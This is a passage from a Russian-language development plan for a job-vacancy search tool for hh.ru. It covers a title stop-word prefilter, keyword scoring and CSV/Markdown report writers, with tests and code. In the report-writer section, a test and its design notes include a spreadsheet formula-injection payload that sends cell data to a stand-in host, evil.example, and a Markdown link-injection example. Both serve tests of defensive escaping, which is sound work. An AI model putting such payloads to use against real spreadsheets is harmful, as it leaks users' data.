            title_tech=[],
            stack=[],
            responsibilities=[],
            domain=[],
        ),
        negative=negative,
    )


def make_vacancy(title: str, company: str | None = None) -> DiscoveredVacancy:
    """Ровно то, что даёт листинг: id, url, title (спека §3.2)."""
    return DiscoveredVacancy(
        id="1",
        url="https://hh.ru/vacancy/1",
        title=title,
        company=company,
        found_by_query="programmist",
    )


def load(name: str) -> str:
    with gzip.open(FIXTURES / name, "rt", encoding="utf-8") as handle:
        return handle.read()


def test_clean_title_passes() -> None:
    prefilter = Prefilter(make_profile(SPEC_NEGATIVE))
    assert prefilter.reason_to_reject(make_vacancy("Backend Team Lead")) is None


def test_reason_names_the_stop_word_that_decided() -> None:
    """Причина уходит в `reject_reason` и остаётся единственным следом
    решения: без названного слова отладку списка сигналов не провести."""
    reason = Prefilter(make_profile(SPEC_NEGATIVE)).reason_to_reject(
        make_vacancy("Junior Python Developer")
    )
    assert reason == "стоп-слово в заголовке: junior"


def test_reason_lists_every_matched_stop_word_in_config_order() -> None:
    """Три совпадения — три слова в причине. Первое из них ничем не лучше
    остальных, а «одно слово из трёх» превращает отладку в угадывание."""
    reason = Prefilter(make_profile(SPEC_NEGATIVE)).reason_to_reject(
        make_vacancy("Программист 1С (стажер/junior)")
    )
    assert reason == "стоп-слово в заголовке: junior, стажёр, 1c"


def test_empty_negative_list_rejects_nothing() -> None:
    """Профиль без стоп-слов — законная конфигурация: конвейер тогда просто
    не отсеивает ничего локально, а не отсеивает всё."""
    prefilter = Prefilter(make_profile([]))
    assert prefilter.reason_to_reject(make_vacancy("Курьер на личном автомобиле")) is None


def test_only_the_title_is_examined() -> None:
    """На шаге 3 известен только заголовок (спека §3.2): компания и регион
    приходят со страницы вакансии, то есть уже после оплаты запросом.
    Стоп-слово в поле, которого у листинга нет, отказом быть не может."""
    prefilter = Prefilter(make_profile(SPEC_NEGATIVE))
    vacancy = make_vacancy("Инженер-программист", company="Продажи и курьеры")
    assert prefilter.reason_to_reject(vacancy) is None


def test_empty_stop_word_cannot_reach_the_prefilter() -> None:
    """Страховка на самое дорогое: пустой сигнал компилируется в регулярку
    из одних границ слова и отбраковывает почти любой заголовок — молча и
    необратимо. Отвергается дважды, и оба раза проверяются здесь."""
    with pytest.raises(ValidationError):
        make_profile([""])
    with pytest.raises(ValueError, match="пустой сигнал"):
        SignalMatcher([" "])


def test_no_good_title_is_lost_on_the_live_listing() -> None:
    """Живая страница `/vacancies/programmist`, 20 настоящих заголовков.

    Проверяется список выживших ЦЕЛИКОМ, а не только число отказов: ложный
    отказ выбрасывает хорошую вакансию навсегда, и это самая дорогая
    ошибка конвейера. Список зафиксирован по факту прогона; любое
    расширение стоп-слов, задевающее эти девять заголовков, обязано
    покраснеть здесь.
    """
    prefilter = Prefilter(make_profile(SPEC_NEGATIVE))
    vacancies = parse_listing(load(LIVE_LISTING), "programmist")
    assert len(vacancies) == 20

    survived = [v.title for v in vacancies if prefilter.reason_to_reject(v) is None]
    assert survived == [
        "Программист: WinForms (MVP), C#, .NET",
        "Программист-разработчик С#",
        "Java разработчик (ученик)",
        "Программист .Net",
        "Разработчик систем извлечения данных",
        "Инженер-программист",
        "Преподаватель для младшей школы (программирование и ИТ)",
        "Программист на ПО Fansy (SPECTRE, DEPO)",
        "Программист SQL/Delphi",
    ]
```

Про живую фикстуру, чтобы число не выглядело магическим: из 20 заголовков префильтр
отбраковывает 11 (стажёр/junior/1С в разных написаниях) и пропускает 9 — **ноль ложных
отказов**. Среди пропущенных есть заведомо нерелевантные («Преподаватель для младшей
школы») — это правильная сторона размена: их отсеет скоринг, и они стоят одного запроса,
а не потерянной вакансии.

- [ ] **Step 2: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_prefilter.py -v`
Expected: `ModuleNotFoundError: No module named 'hh_search.filtering.prefilter'`, «1 error»
(падение на сборке модуля — файла ещё нет)

- [ ] **Step 3: Реализовать `hh_search/filtering/prefilter.py`**

```python
"""Шаг 3 конвейера: единственный барьер перед дорогим шагом 4.

На этом шаге известен ТОЛЬКО заголовок. Discovery идёт по листингу
`/vacancies/{slug}`, который отдаёт id, url и название — компания, регион,
зарплата и дата публикации приходят со страницы вакансии, то есть уже
после того, как за неё заплачено запросом (спека §3.2, §4.1). Поэтому
отсева по региону здесь нет и быть не может.

Цена ошибки асимметрична: ложный отказ — это `status='rejected'`
навсегда, хорошая вакансия не вернётся ни следующим прогоном, ни после
правки конфига. Пропущенный мусор стоит одного запроса к hh.ru. Отсюда
и правило: отсеиваем только по явным стоп-словам, ничего не угадываем.
"""

from hh_search.config.models import ProfileConfig
from hh_search.domain.models import DiscoveredVacancy
from hh_search.filtering.matching import SignalMatcher


class Prefilter:
    """Дешёвый отсев по заголовку — стоит до скачивания страницы вакансии."""

    def __init__(self, profile: ProfileConfig) -> None:
        # Пустой сигнал сюда не доедет: его отвергают и валидатор конфига
        # (`Signal` в config/models.py), и сам `_compile`. Проверять третий
        # раз здесь нечего — но тест на это в suite'е есть, потому что
        # именно в отсеве последствия такого сигнала необратимы.
        self._negative = SignalMatcher(profile.negative)

    def reason_to_reject(self, vacancy: DiscoveredVacancy) -> str | None:
        """Причина отказа или `None`, если вакансия идёт дальше.

        В причину попадают ВСЕ совпавшие стоп-слова, а не первое: причина
        уходит в `reject_reason` и остаётся единственным следом решения,
        а «одно слово из трёх» превращает отладку списка сигналов в
        угадывание.
        """
        matched = self._negative.find(vacancy.title)
        if matched:
            return f"стоп-слово в заголовке: {', '.join(matched)}"
        return None
```

- [ ] **Step 4: Запустить все проверки**

Run: `uv run pytest tests/test_prefilter.py -v && uv run pytest -q && uv run mypy hh_search tests && uv run ruff check hh_search tests && uv run ruff format --check hh_search/filtering/prefilter.py tests/test_prefilter.py`
Expected: `7 passed`, затем `245 passed` (238 до задачи + 7), `Success: no issues found`,
`All checks passed!`, `2 files already formatted`

`ruff format --check` запускается **по новым файлам, а не по репозиторию**: форматтер
вводится в CI задачей 13, и на текущем HEAD ему не соответствуют 13 существующих файлов.
Новый код обязан соответствовать сразу, чтобы задача 13 не превратилась в переформатирование
всего проекта.

- [ ] **Step 5: Коммит**

```bash
git add hh_search/filtering/prefilter.py tests/test_prefilter.py
git commit -m "feat: префильтр по стоп-словам в заголовке

Отсекает мусор до скачивания страницы вакансии — именно этот шаг
удерживает нагрузку на hh.ru на уровне единиц запросов за прогон.
Отсев только по заголовку: после переезда discovery на листинг
регион и компания на этом шаге неизвестны в принципе.
Главный тест — на живой фикстуре листинга: 20 настоящих заголовков,
11 отказов, ноль ложных. Ложный отказ необратим."
```

---

### Task 8: Скоринг

**Files:**
- Create: `hh_search/scoring/__init__.py`, `hh_search/scoring/base.py`, `hh_search/scoring/keyword.py`
- Test: `tests/test_scoring.py`

**Interfaces:**
- Consumes: `ProfileConfig` из Task 1, `SignalMatcher` из Task 2, `DiscoveredVacancy`/`VacancyDetails`/`ScoreBreakdown` из Task 3
- Produces: протокол `Scorer` с методом `score(discovered: DiscoveredVacancy, details: VacancyDetails) -> ScoreBreakdown`; `class KeywordScorer(profile: ProfileConfig)`, реализующий его

Формула (спека §6): `total = max(100 × (0.40·title + 0.30·stack + 0.20·responsibilities + 0.10·domain) − penalty, 0)`.
Компонент `title` — 1.0, если в заголовке есть и роль, и технология; 0.5, если что-то одно; иначе 0.
`stack` и `responsibilities` — `min(len(найдено) / saturation, 1.0)` по описанию.
`domain` — 1.0, если сигнал домена встретился в описании или названии компании.
`penalty` — количество негативных сигналов в заголовке и описании, умноженное на `penalty_per_signal`.

**Три решения, которые обязаны попасть в код именно так, потому что иначе тесты стерегут
не то, ради чего задача существует.**

1. **Компания читается из `details`, а не только из `discovered`.** Листинг компанию не
   отдаёт, а в базу она попадает тем же `save_enriched`, который сохраняет оценку, — то
   есть **после** вызова скорера. Читая только `discovered.company`, домен терялся бы у
   каждой вакансии на первом прогоне и находился лишь при локальном пересчёте.
2. **Верхнего `clamp` нет.** Компоненты ≤ 1.0, веса неотрицательны и суммируются в 1.0
   (валидатор `Weights`), штраф неотрицателен (`penalty_per_signal ≥ 0`) — значит
   `total ≤ 100` по построению. `min(..., 100.0)` был бы кодом, который не исполняется ни
   на одном валидном входе, то есть и проверить его нечем. Нижний `max(..., 0.0)`
   достижим любым мусорным заголовком и тестом закрыт.
3. **Округляется только `total`.** Компоненты остаются как есть (`0.3333…`, а не `0.33`):
   `score_detail` читает человек, настраивающий веса, и арифметика §6 по разбивке должна
   сходиться обратно к `total`. Округлённые компоненты её ломают: `0.20·0.33` даёт 58.6
   там, где формула даёт 58.7. Пример JSON в §6 спеки округлён для читаемости — это
   иллюстрация, а не формат.

**Известное ограничение, не закрываемое кодом:** дубликат в списке сигналов накручивает
насыщение. `stack: [yocto, yocto, yocto, yocto, yocto]` при `saturation.stack = 5` даёт
1.0 на описании с одним словом, потому что `find` возвращает по одному вхождению на
паттерн, а не на уникальное слово. Дубликат в YAML — законный ключ с законным значением,
ловить его нечем; проверяется глазами при правке профиля.

- [ ] **Step 1: Написать падающий тест**

Создать `tests/test_scoring.py`:

```python
import gzip
from pathlib import Path

from hh_search.config.models import ProfileConfig, Saturation, Signals, Weights
from hh_search.domain.models import DiscoveredVacancy, ScoreBreakdown, VacancyDetails
from hh_search.scoring.keyword import KeywordScorer
from hh_search.sources.vacancy_page import parse_vacancy_page

FIXTURES = Path(__file__).parent / "fixtures"
LIVE_VACANCY = "vacancy.html.gz"


def make_profile() -> ProfileConfig:
    """Стенд для арифметики §6: в stack шесть сигналов при насыщении 5, в
    responsibilities четыре при насыщении 3 — иначе «насыщение» проверить
    нечем, `min(n/n, 1.0)` и `n/n` неразличимы."""
    return ProfileConfig(
        weights=Weights(title=0.4, stack=0.3, responsibilities=0.2, domain=0.1),
        saturation=Saturation(stack=5, responsibilities=3),
        penalty_per_signal=15,
        signals=Signals(
            title_roles=["team lead", "senior"],
            title_tech=["backend", "embedded"],
            stack=["yocto", "buildroot", "c++", "kubernetes", "kafka", "docker"],
            responsibilities=["архитектур", "менторинг", "код-ревью", "проектирован"],
            domain=["телеком"],
        ),
        negative=["junior", "1c", "продаж"],
    )


def score_for(
    title: str,
    description: str,
    company: str | None = None,
    page_company: str | None = None,
) -> ScoreBreakdown:
    discovered = DiscoveredVacancy(
        id="1",
        url="https://hh.ru/vacancy/1",
        title=title,
        company=company,
        found_by_query="programmist",
    )
    details = VacancyDetails(description=description, company=page_company)
    return KeywordScorer(make_profile()).score(discovered, details)


def load(name: str) -> str:
    with gzip.open(FIXTURES / name, "rt", encoding="utf-8") as handle:
        return handle.read()


# --- отдельные компоненты -------------------------------------------------


def test_empty_vacancy_scores_zero() -> None:
    assert score_for("Курьер", "Доставка заказов").total == 0.0


def test_title_needs_both_role_and_tech_for_full_component() -> None:
    assert score_for("Senior Embedded Engineer", "").title == 1.0


def test_title_with_only_role_gives_half() -> None:
    assert score_for("Senior Engineer", "").title == 0.5


def test_stack_is_proportional_below_saturation() -> None:
    assert score_for("Инженер", "Опыт Yocto и Buildroot").stack == 0.4


def test_stack_saturates_above_configured_count() -> None:
    """Шесть сигналов при насыщении 5. Ровно пять ничего не доказали бы:
    `min(5/5, 1.0)` равно `5/5` при любом устройстве формулы."""
    result = score_for(
        "Senior Embedded Engineer",
        "Yocto, Buildroot, C++, Kubernetes, Kafka, Docker — всё это в проекте",
    )
    assert result.stack == 1.0
    # Без насыщения было бы 6/5 = 1.2 и total 76.0.
    assert result.total == 70.0


def test_responsibilities_saturate_above_their_own_count() -> None:
    """У responsibilities своё насыщение (3), и оно тоже проверяется
    превышением: четыре сигнала при трёх."""
    result = score_for(
        "Инженер",
        "Архитектура, менторинг, код-ревью и проектирование подсистем",
    )
    assert result.responsibilities == 1.0
    # Без насыщения было бы 4/3 = 1.33 и total 26.7.
    assert result.total == 20.0


def test_domain_matches_company_name() -> None:
    assert score_for("Инженер", "", company="Телеком Решения").domain == 1.0


def test_domain_sees_the_company_from_the_freshly_parsed_page() -> None:
    """На первом скоринге компания известна только из `details`.

    Листинг её не отдаёт, а в базу она попадает тем же `save_enriched`,
    который сохраняет оценку, — то есть ПОСЛЕ вызова скорера. Читать
    только `discovered.company` значило бы терять домен у каждой вакансии
    на первом прогоне и находить его лишь при локальном пересчёте.
    """
    assert score_for("Инженер", "", page_company="Телеком Решения").domain == 1.0


# --- формула целиком ------------------------------------------------------


def test_weights_follow_the_spec_formula() -> None:
    """0.40·1.0 + 0.30·(2/5) + 0.20·(1/3) + 0.10·0 = 0.5867 → 58.7.

    Все четыре компонента здесь РАЗНЫЕ, поэтому перестановка любых двух
    весов меняет результат. Тест «идеальная вакансия даёт 100» этого не
    ловит: при всех компонентах 1.0 сумма весов равна 1.0 в любом порядке.
    """
    result = score_for("Senior Embedded Engineer", "Опыт Yocto и Buildroot, участие в архитектуре.")
    assert result.title == 1.0
    assert result.stack == 0.4
    assert result.total == 58.7


def test_perfect_match_reaches_hundred() -> None:
    description = (
        "Yocto Buildroot C++ Kubernetes Kafka. "
        "Архитектура, менторинг, код-ревью, проектирование. Телеком"
    )
    assert score_for("Senior Embedded Engineer", description).total == 100.0


def test_penalty_scales_with_number_of_signals() -> None:
    """Два стоп-слова — два штрафа. Одно неразличимо: `len(negative) * 15`
    и `15 if negative else 0` дают на нём одно и то же число."""
    result = score_for("Senior Embedded Engineer", "Знание 1С и опыт продаж")
    assert result.matched["negative"] == ["1c", "продаж"]
    assert result.penalty == 30.0
    assert result.total == 10.0


def test_total_never_goes_below_zero() -> None:
    assert score_for("Junior 1C", "Junior 1C, продажи").total == 0.0


def test_matched_lists_follow_config_order() -> None:
    """Порядок в разбивке — порядок КОНФИГА, а не порядок вхождения в текст.
    В описании сначала Kafka, в конфиге сначала yocto."""
    result = score_for("Senior Embedded Engineer", "Опыт Kafka и Yocto")
    assert result.matched["stack"] == ["yocto", "kafka"]
    assert result.matched["title_roles"] == ["senior"]


# --- живая страница -------------------------------------------------------


def spec_profile() -> ProfileConfig:
    """Образец profile.yaml из спеки §7 — тот, что поедет в прод.

    Списки заданы через `|`, потому что среди сигналов есть многословные
    («team lead», «ручн тестиров»), а вертикальная простыня из шестидесяти
    строк не читается.
    """
    return ProfileConfig(
        weights=Weights(title=0.40, stack=0.30, responsibilities=0.20, domain=0.10),
        saturation=Saturation(stack=5, responsibilities=3),
        penalty_per_signal=15,
        signals=Signals(
            title_roles="team lead|tech lead|teamlead|senior|ведущ|старш|руководител".split("|"),
            title_tech="backend|embedded|linux|c++|python|node|node.js|nodejs|firmware".split("|"),
            stack=(
                "yocto|buildroot|openwrt|bsp|kernel|arm|arm64|armv7|armv8|c++|python|node.js|"
                "typescript|docker|kubernetes|kafka|postgresql|clickhouse|llm|rag|mcp"
            ).split("|"),
            responsibilities=(
                "архитектур|менторинг|код-ревью|code review|проектирован|техдолг"
            ).split("|"),
            domain="телеком|встраиваем|embedded|iot|микросервис".split("|"),
        ),
        negative=(
            "junior|стажёр|intern|1c|продаж|рекрутер|ручн тестиров|оператор пк|"
            "оператор call|оператор колл|оператор станка|курьер"
        ).split("|"),
        report_threshold=60,
    )


def test_live_vacancy_page_scores_as_measured() -> None:
    """Живая страница вакансии, идеально целевая по названию, и профиль из §7.

    Числа зафиксированы по факту прогона, а не по желаемому, и факт
    неприятный: 80.0 набраны при НУЛЕВОМ вкладе обязанностей — ни один из
    шести сигналов `responsibilities` в описании не встретился, хотя это
    ровно та вакансия, ради которой сервис написан. Двадцать очков из ста
    здесь не заработали, и увидеть это надо при реализации, а не в проде
    по пустому разделу «Топ».

    Заодно это второй, независимый от синтетики свидетель насыщения:
    совпало семь сигналов стека при насыщении 5.
    """
    details = parse_vacancy_page(load(LIVE_VACANCY))
    discovered = DiscoveredVacancy(
        id="135586311",
        url="https://hh.ru/vacancy/135586311",
        title="Старший инженер-разработчик Embedded Linux (BSP, ARM64, i.MX 8M Plus)",
        found_by_query="programmist",
    )
    result = KeywordScorer(spec_profile()).score(discovered, details)
    assert result.matched["stack"] == ["yocto", "buildroot", "bsp", "kernel", "arm", "arm64", "c++"]
    assert result.matched["responsibilities"] == []
    assert (result.title, result.stack, result.responsibilities, result.domain) == (
        1.0,
        1.0,
        0.0,
        1.0,
    )
    assert result.penalty == 0.0
    assert result.total == 80.0
```

Тест на живой фикстуре — не украшение: он единственный, кто здесь смотрит на настоящий
текст описания. Его вывод (80.0 при нулевых обязанностях) — вход для настройки профиля в
задаче 12, а не повод подкрутить ожидание.

- [ ] **Step 2: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_scoring.py -v`
Expected: `ModuleNotFoundError: No module named 'hh_search.scoring'`, «1 error»

- [ ] **Step 3: Реализовать `hh_search/scoring/base.py`**

```python
from typing import Protocol

from hh_search.domain.models import DiscoveredVacancy, ScoreBreakdown, VacancyDetails


class Scorer(Protocol):
    """Точка расширения: сюда позже встанет оценщик на LLM (Claude, OpenAI, локальная модель)."""

    def score(self, discovered: DiscoveredVacancy, details: VacancyDetails) -> ScoreBreakdown: ...
```

- [ ] **Step 4: Реализовать `hh_search/scoring/keyword.py`**

```python
from hh_search.config.models import ProfileConfig
from hh_search.domain.models import DiscoveredVacancy, ScoreBreakdown, VacancyDetails
from hh_search.filtering.matching import SignalMatcher


class KeywordScorer:
    """Оценка по спискам ключевых слов из profile.yaml (спека §6).

    total = 100 × (w.title·title + w.stack·stack + w.resp·resp + w.domain·domain) − penalty,
    снизу подрезано нулём.

    Известное ограничение: дубликат в списке сигналов накручивает
    насыщение. `stack: [yocto, yocto, yocto, yocto, yocto]` при
    `saturation.stack = 5` даёт 1.0 на описании с одним словом — `find`
    возвращает по одному вхождению на ПАТТЕРН, а не на уникальное слово.
    Ловить это в коде нечем: дубликат в YAML — законный ключ с законным
    значением. Проверяется глазами при правке профиля.
    """

    def __init__(self, profile: ProfileConfig) -> None:
        self._profile = profile
        signals = profile.signals
        self._title_roles = SignalMatcher(signals.title_roles)
        self._title_tech = SignalMatcher(signals.title_tech)
        self._stack = SignalMatcher(signals.stack)
        self._responsibilities = SignalMatcher(signals.responsibilities)
        self._domain = SignalMatcher(signals.domain)
        self._negative = SignalMatcher(profile.negative)

    def score(self, discovered: DiscoveredVacancy, details: VacancyDetails) -> ScoreBreakdown:
        title = discovered.title
        description = details.description
        company = discovered.company or details.company or ""

        roles = self._title_roles.find(title)
        tech = self._title_tech.find(title)
        stack = self._stack.find(description)
        responsibilities = self._responsibilities.find(description)
        domain = self._domain.find(f"{description}\n{company}")
        negative = self._negative.find(f"{title}\n{description}")

        title_component = 1.0 if roles and tech else (0.5 if roles or tech else 0.0)
        # Насыщение обязательно: без min(...) оценка измеряла бы длину
        # описания, а не релевантность (спека §6). Делитель ≥ 1 гарантирован
        # валидатором конфига — иначе здесь было бы деление на ноль уже
        # ПОСЛЕ похода в сеть.
        stack_component = min(len(stack) / self._profile.saturation.stack, 1.0)
        responsibilities_component = min(
            len(responsibilities) / self._profile.saturation.responsibilities, 1.0
        )
        domain_component = 1.0 if domain else 0.0

        weights = self._profile.weights
        weighted = (
            weights.title * title_component
            + weights.stack * stack_component
            + weights.responsibilities * responsibilities_component
            + weights.domain * domain_component
        )
        # Штраф пропорционален ЧИСЛУ стоп-слов: одно случайное слово не
        # убивает хорошую вакансию, три убивают (спека §6).
        penalty = len(negative) * self._profile.penalty_per_signal
        # Верхнего clamp'а нет сознательно: компоненты ≤ 1.0, веса
        # неотрицательны и суммируются в 1.0 (валидатор `Weights`), штраф
        # неотрицателен — значит total ≤ 100 по построению, и min(..., 100)
        # был бы кодом, который не может исполниться ни на одном входе, то
        # есть и проверить его было бы нечем. Нижний нужен: штраф
        # утаскивает сумму в минус на любом мусорном заголовке.
        total = max(100.0 * weighted - penalty, 0.0)

        return ScoreBreakdown(
            title=title_component,
            stack=stack_component,
            responsibilities=responsibilities_component,
            domain=domain_component,
            penalty=penalty,
            # Округляется только total — число, которое человек сравнивает с
            # порогом. Компоненты остаются как есть: по ним арифметика §6
            # должна сходиться обратно, а 0.67 вместо 1/3 её ломает.
            total=round(total, 1),
            matched={
                "title_roles": roles,
                "title_tech": tech,
                "stack": stack,
                "responsibilities": responsibilities,
                "domain": domain,
                "negative": negative,
            },
        )
```

Создать пустой `hh_search/scoring/__init__.py`.

- [ ] **Step 5: Запустить все проверки**

Run: `uv run pytest tests/test_scoring.py -v && uv run pytest -q && uv run mypy hh_search tests && uv run ruff check hh_search tests && uv run ruff format --check hh_search/scoring tests/test_scoring.py`
Expected: `14 passed`, затем `259 passed`, `Success: no issues found`, `All checks passed!`,
`4 files already formatted`

- [ ] **Step 6: Коммит**

```bash
git add hh_search/scoring tests/test_scoring.py
git commit -m "feat: keyword-скоринг с насыщением и штрафами

Насыщение обязательно: без него оценка измеряла бы длину описания,
а не релевантность. Штраф вычитается пропорционально числу стоп-слов,
поэтому одно случайное слово не убивает хорошую вакансию, а три
убивают. Разбивка со списком совпавших слов сохраняется — без неё
веса невозможно настроить.

Тесты стерегут саму формулу: разные значения всех четырёх компонентов
(перестановка весов краснеет), превышение насыщения, а не равенство
ему, два стоп-слова вместо одного. Живая страница вакансии показывает
факт: 80.0 при нулевом вкладе обязанностей."
```

---

### Task 9: Приёмники отчётов

**Files:**
- Create: `hh_search/sinks/__init__.py`, `hh_search/sinks/base.py`, `hh_search/sinks/csv_sink.py`, `hh_search/sinks/markdown_sink.py`
- Test: `tests/test_sinks.py`

**Interfaces:**
- Consumes: `ScoredVacancy` из Task 3
- Produces: протокол `Sink` (атрибут `name: str`, метод `emit(vacancies: Sequence[ScoredVacancy], now: datetime) -> None`), константа `REPORT_DATE_FORMAT`; `class CsvSink(reports_dir: Path)`; `class MarkdownSink(reports_dir: Path, threshold: float)`; фабрика `build_sinks(names: Sequence[str], reports_dir: Path, threshold: float) -> list[Sink]` (неизвестное имя → `ValueError`)

Имена файлов: `{reports_dir}/{YYYY-MM-DD}-new.csv` и `{reports_dir}/{YYYY-MM-DD}-new.md`.
Повторный прогон в тот же день **дописывает** данные в существующие файлы; заголовок CSV и
BOM пишутся только при создании.

**Почему у этой задачи тесты подробнее кода.** После `mark_reported()` вакансия навсегда
уходит из `unreported()` — переотправки нет по построению (спека §5.2). Всё, что приёмник
потерял или затёр, потеряно **окончательно**: колонка, которую он не записал, раздел,
который затёр второй прогон дня, вакансия, съеденная строгим неравенством на пороге. Из-за
этого тесты проверяют состав строки CSV **целиком** (сравнением всего словаря
`csv.DictReader`), а не три поля из двенадцати.

**Четыре решения по формату, каждое — следствие факта, а не вкуса.**

1. **CSV: `utf-8-sig` и `delimiter=";"`.** Без BOM Excel читает UTF-8 как cp1251 и
   показывает `ÐžÐžÐž`; с русской локалью разделителем списка является `;`, и файл с
   запятыми целиком ложится в первую колонку. BOM при этом пишется **ровно один раз за
   файл**: кодек `utf-8-sig` добавляет его при каждом открытии, поэтому второй прогон дня
   должен открывать файл как `utf-8`.
2. **CSV: обезвреживание формул.** Заголовок и название компании пишет работодатель, то
   есть это внешний недоверенный текст. Значение вида
   `=HYPERLINK("http://evil.example/?u="&A1;"вакансия")` Excel исполнит, а вполне обычный
   заголовок `+7 (999) 123-45-67 — Embedded Linux` покажет как `#ИМЯ?`. Квотирование
   модуля `csv` от этого не защищает — оно про разделители, а не про интерпретацию.
   Лечение — префикс `'` для значений, начинающихся с `= + - @ \t \r`.
3. **Markdown: экранирование.** `[Удалённо]` в начале названия на hh.ru встречается, а
   `**[Ссылка ](https://evil.example) конец](https://hh.ru/vacancy/4)**` рендерится как
   рабочая ссылка на чужой сайт. Экранируются `[ ] \` ` * _`, а переводы строк
   схлопываются: пустая строка внутри пункта — это конец пункта для любого рендерера.
4. **Формат даты задан явно.** Из хранилища даты приходят как aware UTC
   (`storage/time_utils.py`), то есть `isoformat()` дал бы
   `2026-07-27T11:48:48.366000+00:00` — с микросекундами, не читаемое человеком и не
   распознаваемое Excel как дата. В отчёте `%Y-%m-%d %H:%M`, время — UTC, как в базе.
   `published_at` при этом **необязателен** (листинг даты не отдаёт): неизвестная дата —
   пустая ячейка, а не строка `None` и не падение.

**Колонка `found_by_query` переименована в `listing`.** После переезда discovery в этом
поле лежит slug листинга (`programmist`), а не текст поискового запроса; прежнее имя
вводило бы в заблуждение читателя отчёта. Имя поля модели не меняется — оно фигурирует в
хранилище и в задаче 10.

**Неизвестное имя sink обязано ронять процесс на старте.** `build_sinks` для этого
вызывается **до `start_run()`** и до первого сетевого запроса (требование спеки §7/§9) —
это контракт для задачи 10. Проверять имена типом (`Literal["csv", "markdown"]` в
`app.yaml`) не стали: список приёмников раздвоился бы между схемой конфига и фабрикой, а
расширение через `Sink` — заявленная точка роста (спека §4.2).

- [ ] **Step 1: Написать падающий тест**

Создать `tests/test_sinks.py`:

```python
import csv
import re
from datetime import UTC, datetime
from pathlib import Path

import pytest

from hh_search.domain.models import (
    DiscoveredVacancy,
    Salary,
    ScoreBreakdown,
    ScoredVacancy,
    VacancyDetails,
)
from hh_search.sinks import build_sinks
from hh_search.sinks.csv_sink import COLUMNS, CsvSink
from hh_search.sinks.markdown_sink import SNIPPET_LENGTH, MarkdownSink

# Данные тестов повторяют то, что приходит из хранилища: даты — aware UTC с
# микросекундами (`storage/time_utils.py`), а зарплата и дата публикации
# могут отсутствовать честно (листинг их не отдаёт, а на странице вакансии
# блока зарплаты может не быть вовсе).
NOW = datetime(2026, 7, 27, 10, 0, tzinfo=UTC)
PUBLISHED = datetime(2026, 7, 27, 6, 21, 20, 933000, tzinfo=UTC)
SALARY = Salary(raw="от 200 000 ₽", amount_from=200000, currency="₽")


def make_scored(
    vacancy_id: str = "1",
    title: str = "Embedded Engineer",
    total: float = 87.4,
    cluster: str = "embedded",
    company: str | None = "ООО Ромашка",
    area: str | None = "Нижний Новгород",
    salary: Salary = SALARY,
    published_at: datetime | None = PUBLISHED,
    description: str = "Требуется опыт Yocto и BSP.",
) -> ScoredVacancy:
    return ScoredVacancy(
        discovered=DiscoveredVacancy(
            id=vacancy_id,
            url=f"https://hh.ru/vacancy/{vacancy_id}",
            title=title,
            company=company,
            area=area,
            salary=salary,
            published_at=published_at,
            found_by_query="programmist",
        ),
        details=VacancyDetails(description=description),
        score=ScoreBreakdown(
            title=1.0,
            stack=0.8,
            responsibilities=0.5,
            domain=1.0,
            penalty=0.0,
            total=total,
            matched={"stack": ["yocto"]},
        ),
        cluster=cluster,
    )


def read_rows(path: Path) -> list[dict[str, str]]:
    with path.open(encoding="utf-8-sig", newline="") as handle:
        return list(csv.DictReader(handle, delimiter=";"))


# --- CSV: второго шанса не будет ------------------------------------------


def test_csv_row_carries_every_column(tmp_path: Path) -> None:
    """Сравнивается словарь ЦЕЛИКОМ, а не три поля из двенадцати.

    После `mark_reported()` вакансия навсегда уходит из `unreported()`:
    колонка, которую приёмник не записал, потеряна окончательно —
    переотправки нет по построению (спека §5.2).
    """
    CsvSink(tmp_path).emit([make_scored()], NOW)
    rows = read_rows(tmp_path / "2026-07-27-new.csv")
    assert rows == [
        {
            "id": "1",
            "score": "87.4",
            "cluster": "embedded",
            "title": "Embedded Engineer",
            "company": "ООО Ромашка",
            "area": "Нижний Новгород",
            "salary_from": "200000",
            "salary_to": "",
            "currency": "₽",
            "published_at": "2026-07-27 06:21",
            "listing": "programmist",
            "url": "https://hh.ru/vacancy/1",
        }
    ]


def test_csv_opens_in_excel(tmp_path: Path) -> None:
    """BOM и `;` — не вкус, а условие читаемости.

    Без BOM Excel читает UTF-8 как cp1251 и показывает `ÐžÐžÐž`; с русской
    локалью разделителем списка является `;`, и файл с запятыми целиком
    ложится в первую колонку.
    """
    CsvSink(tmp_path).emit([make_scored()], NOW)
    raw = (tmp_path / "2026-07-27-new.csv").read_bytes()
    assert raw.startswith(b"\xef\xbb\xbf")
    header = raw.decode("utf-8-sig").splitlines()[0]
    assert header == ";".join(COLUMNS)


def test_csv_appends_second_run_without_repeating_header_or_bom(tmp_path: Path) -> None:
    """Второй прогон дня дописывает, а не начинает файл заново — и не
    вставляет второй BOM: кодек utf-8-sig пишет его при каждом открытии."""
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id="1")], NOW)
    sink.emit([make_scored(vacancy_id="2")], NOW)
    path = tmp_path / "2026-07-27-new.csv"
    assert [row["id"] for row in read_rows(path)] == ["1", "2"]
    assert path.read_text(encoding="utf-8-sig").count("\ufeff") == 0


def test_csv_neutralizes_formula_written_by_the_employer(tmp_path: Path) -> None:
    """Заголовок вакансии — внешний недоверенный текст: его пишет
    работодатель. Квотирование модуля csv от формул не защищает."""
    title = '=HYPERLINK("http://evil.example/?u="&A1;"вакансия")'
    CsvSink(tmp_path).emit(
        [make_scored(title=title, company="+7 (999) 123-45-67 — Embedded Linux")], NOW
    )
    row = read_rows(tmp_path / "2026-07-27-new.csv")[0]
    assert row["title"] == f"'{title}"
    assert row["company"] == "'+7 (999) 123-45-67 — Embedded Linux"


def test_csv_leaves_unknown_date_and_salary_empty(tmp_path: Path) -> None:
    """`published_at` необязателен, а блока зарплаты на странице может не
    быть вовсе. В отчёте это пустые ячейки, а не строка `None` и не падение."""
    CsvSink(tmp_path).emit([make_scored(published_at=None, salary=Salary())], NOW)
    row = read_rows(tmp_path / "2026-07-27-new.csv")[0]
    assert row["published_at"] == ""
    assert (row["salary_from"], row["salary_to"], row["currency"]) == ("", "", "")


# --- Markdown: порог меняет подробность, а не состав ----------------------


def test_markdown_splits_top_and_rest_by_threshold(tmp_path: Path) -> None:
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Хорошая вакансия", total=87.4),
            make_scored(vacancy_id="2", title="Так себе вакансия", total=42.0, cluster="backend"),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
